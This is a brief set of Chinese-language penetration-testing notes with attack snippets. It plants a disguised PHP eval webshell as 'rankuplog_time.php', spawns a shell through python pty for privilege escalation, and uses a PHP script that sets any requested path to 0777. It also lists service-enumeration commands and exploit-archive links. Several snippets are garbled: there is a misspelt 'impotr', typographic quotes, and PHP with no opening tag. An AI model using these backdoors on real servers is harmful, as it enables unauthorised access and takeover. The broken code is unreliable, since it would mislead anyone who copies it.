#### php 后门
```php
echo -e "<?php @eval(\$_POST[md5])?>" > rankuplog_time.php 
cat rankuplog_time.php 
```

#### 跨站
```python
ls -la /www.users/ 
```

#### 溢出提权
```python
python –c ‘impotr pty;pty.spawn(“/bin/sh”); 
```
- 第三方软件漏洞
- 本地信任特性
- 内核溢出

#### docs
- http://tools.90sec.org/
- http://sebug.net/paper/linux_exp/
- http://x73.cc/bitch/exp/
- http://www.exploit-db.com/search/


#### 利用跨站代码
```php
$path = stripslashes($_GET['path']);
$ok = chmod ($path , 0777);

if ($ok == true)
  echo CHMOD OK , Permission editable file or directory. Permission to write;
?>
```

```cmd
service --status-all | grep running
service --status-all | grep http
```

#### 重启ssh
```cmd
/usr/sbin/sshd stop
usr/sbin/sshd start 
```
